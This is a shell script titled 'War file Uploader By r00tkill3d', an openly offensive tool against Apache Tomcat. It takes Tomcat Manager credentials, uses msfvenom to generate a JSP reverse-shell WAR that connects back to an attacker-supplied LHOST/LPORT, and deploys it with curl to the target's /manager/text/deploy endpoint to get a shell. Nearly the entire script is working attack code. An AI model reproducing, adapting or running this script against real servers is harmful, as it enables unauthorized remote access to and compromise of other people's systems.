#!/bin/sh

  echo "War file Uploader By r00tkill3d"
if [ -z "$1" ]; then
  echo "[*] Tomcat File Uploader"
  echo "[*] Usage :$0 <IP address> "
  exit 0
fi

read -p " Do you want me to generate a payload for you? Y/N:" ot
if [ $ot = Y ]
then 
 echo  "Cool.. Lazy ass"
  read -p " Enter Tomcat Manager Username: " user
  read -p " Enter Tomcat Manager Password: " pass
  read -p " Enter LHOST: " lho
  read -p " Enter LPORT: " lpo

 msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lho LPORT=$lpo -f war > root.war
 curl -u ''$user'':''$pass'' -T root.war http://$1:8080/manager/text/deploy?path=/r00t3d

else
  read -p " Enter .War file: " wr
  read -p " Enter Tomcat Manager Username: " user
  read -p " Enter Tomcat Manager Password: " pass
curl -u ''$user'':''$pass'' -T $wr http://$1:8080/manager/text/deploy?path=/r00t3d
  echo "Browse the following for SHELL -> http://$1:8080/manager/text/deploy?path=/r00t3d"

fi
